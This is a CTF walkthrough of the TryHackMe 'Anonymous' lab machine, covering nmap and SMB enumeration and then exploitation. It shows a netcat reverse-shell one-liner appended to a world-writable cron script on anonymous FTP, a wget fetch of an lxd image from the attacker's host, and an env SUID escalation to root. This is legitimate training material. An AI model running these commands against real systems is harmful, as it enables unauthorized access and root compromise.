---
layout: post
title: Anonymous Writeup
date: 2020-08-20 11:00:00 +5:30
categories: [TryHackMe, Medium]
image: /assets/img/anonymous/header.png
tags: [tryhackme, anonymous-ftp, gtfobins] # add tag
---

## Description:

The Following Post is writeup of Anonymous room of tryhackme <https://tryhackme.com/room/anonymous>

|Machine|Details
|:---|:--
|OS | Linux
|Rating | Medium
|Creator | namelessone

## Summary

  The Room have 4 ports open with anonymous logins in ftp and one of the share is exposed.
  After logging into ftp we see a script which can possibly running as cronjob.
  Put a reverse shell script and wait for shell to spawn. Now for PrivEsc we can see env have suid permissions.
  Exploiting it will get us root flag.

## Walkthrough

### Enumeration

Let's start with nmap scan.

```bash
nmap -sC -sV -oA nmap/pickhill 10.10.74.228
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-26 10:45 IST
Nmap scan report for 10.10.74.228
Host is up (0.31s latency).
Not shown: 995 closed ports
PORT     STATE    SERVICE     VERSION
21/tcp   open     ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts [NSE: writeable]
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.9.124.57
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
8001/tcp filtered vcom-tunnel
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 18s, deviation: 0s, median: 17s
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2020-08-26T05:16:21+00:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-08-26T05:16:21
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.52 seconds
```

Let's start with ftp.

#### FTP

Let's check by logging into it.

Logged in as anonymous
```bash
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04 19:26 .
drwxr-xr-x    3 65534    65534        4096 May 13 19:49 ..
-rwxr-xrwx    1 1000     1000          314 Jun 04 19:24 clean.sh
-rw-rw-r--    1 1000     1000         2107 Aug 26 05:36 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12 03:50 to_do.txt
226 Directory send OK.
ftp> mget *
mget clean.sh? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for clean.sh (314 bytes).
226 Transfer complete.
314 bytes received in 0.00 secs (350.4464 kB/s)
mget removed_files.log? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for removed_files.log (2150 bytes).
226 Transfer complete.
2150 bytes received in 0.00 secs (9.0326 MB/s)
mget to_do.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for to_do.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.00 secs (412.4612 kB/s)
ftp> exit
```

So basically we can see the script maybe we can edit it to get a shell.<br />
I will come back again let's enum smb now

#### SMB

```bash
=========================================
|    Share Enumeration on 10.10.74.228    |
=========================================

      Sharename       Type      Comment
      ---------       ----      -------
      print$          Disk      Printer Drivers
      pics            Disk      My SMB Share Directory for Pics
      IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.74.228
//10.10.74.228/print$   Mapping: DENIED, Listing: N/A
//10.10.74.228/pics     Mapping: OK, Listing: OK
//10.10.74.228/IPC$     
```
Though pics are open but doesn't contain any usefull info or more or less i already guessed exploitation part.
I found nothing interesting so skipped it.<br />
Let's move on to Exploitation part.

### Exploitation
```bash
silver@parrot  ~/Desktop/tryhackme/anonymous/nmap  curlftpfs anonymous:anon@10.10.74.228 /home/silver/Desktop/tryhackme/anonymous/nmap/my_ftp
 silver@parrot  ~/Desktop/tryhackme/anonymous/nmap  lks
zsh: correct 'lks' to 'ls' [nyae]? y
my_ftp  pickhill.gnmap  pickhill.nmap  pickhill.xml
 silver@parrot  ~/Desktop/tryhackme/anonymous/nmap  cd my_ftp
ls                                                               
 silver@parrot  ~/Desktop/tryhackme/anonymous/nmap/my_ftp  ls
scripts
 silver@parrot  ~/Desktop/tryhackme/anonymous/nmap/my_ftp  ls -la
total 4
drwxr-xr-x 1 root   root   1024 Jan  1  1970 .
drwxr-xr-x 1 silver silver   90 Aug 26 11:15 ..
drwxrwxrwx 2 root   root   4096 Jun  4 19:26 scripts
 silver@parrot  ~/Desktop/tryhackme/anonymous/nmap/my_ftp  cd scripts
 silver@parrot  ~/Desktop/tryhackme/anonymous/nmap/my_ftp/scripts  ls -la
total 16
drwxrwxrwx 2 root root 4096 Jun  4 19:26 .
drwxr-xr-x 1 root root 1024 Jan  1  1970 ..
-rwxr-xrwx 1 root root  314 Jun  4 19:24 clean.sh
-rw-rw-r-- 1 root root 2580 Aug 26 05:47 removed_files.log
-rw-r--r-- 1 root root   68 May 12 03:50 to_do.txt
 silver@parrot  ~/Desktop/tryhackme/anonymous/nmap/my_ftp/scripts  cat clean.sh
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
 silver@parrot  ~/Desktop/tryhackme/anonymous/nmap/my_ftp/scripts  echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.124.57 4444 >/tmp/f" >> clean.sh
zsh: operation not supported: clean.sh
 ✘ silver@parrot  ~/Desktop/tryhackme/anonymous/nmap/my_ftp/scripts  ls -la
total 16
drwxrwxrwx 2 root root 4096 Jun  4 19:26 .
drwxr-xr-x 1 root root 1024 Jan  1  1970 ..
-rwxr-xrwx 1 root root  314 Jun  4 19:24 clean.sh
-rw-rw-r-- 1 root root 2709 Aug 26 05:50 removed_files.log
-rw-r--r-- 1 root root   68 May 12 03:50 to_do.txt
nano clean.sh                                                                                                                        
 silver@parrot  ~/Desktop/tryhackme/anonymous/nmap/my_ftp/scripts  nano clean.sh
 silver@parrot  ~/Desktop/tryhackme/ano

Here we go our reverse shell:-

 silver@parrot  ~/Desktop/tryhackme/anonymous/nmap/my_ftp/scripts  pwncat --listen --port 4444
[11:44:44] received connection from 10.10.74.228:44016                                                                 connect.py:148
[11:44:47] new host w/ hash 9bc647e33bc8a15fe1850dcd4a2752c1                                                            victim.py:329
[11:45:05] pwncat running in /bin/sh                                                                                    victim.py:363
[11:45:16] pwncat is ready 🐈                                                                                           victim.py:762


\[\033[01;31m\](remote)\[\033[00m\] \[\033[01;33m\]\u@\h\[\033[00m\]:\[\033[01;36m\]\w\[\033[00m\]$
\[\033[01;31m\](remote)\[\033[00m\] \[\033[01;33m\]\u@\h\[\033[00m\]:\[\033[01;36m\]\w\[\033[00m\]$ bash
namelessone@anonymous:/$  
```

as user namelessone
Now let's move to PrivEsc

### PrivEsc

Here we go lxd group
```#!/usr/bin/env bash

====================================( Basic information )=====================================
OS: Linux version 4.15.0-99-generic (buildd@lcy01-amd64-013) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #100-Ubuntu SMP Wed Apr 22 20:32:56 UTC 2020
User & Groups: uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

So let's move on to lxd privesc

```bash
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine

python -m SimpleHTTPServer 8001

namelessone@anonymous:/tmp$ lxc list
If this is your first time running LXD on this machine, you should also run: lxd init
To start your first container, try: lxc launch ubuntu:18.04

+------+-------+------+------+------+-----------+
| NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS |
+------+-------+------+------+------+-----------+
namelessone@anonymous:/tmp$ wget 10.9.124.57:8001/alpine.tar.gz

namelessone@anonymous:/tmp$ lxc image import ./alpine.tar.gz --alias myimage

namelessone@anonymous:/tmp$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| myimage | cb2dd242acb1 | no     | alpine v3.12 (20200826_12:01) | x86_64 | 2.97MB | Aug 26, 2020 at 6:35am (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+

Error: No storage pool found. Please create a new storage pool
```

Ahh looks like not a right way though let's check another way


### SUID

Got env suid didn't notice it though let's check gtfobins

![env](/assets/img/anonymous/envsuid.png)

```#!/usr/bin/env bash

namelessone@anonymous:/tmp# id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

got euid 0

let's look into root.txt

![root.txt](/assets/img/anonymous/roottxt.png)
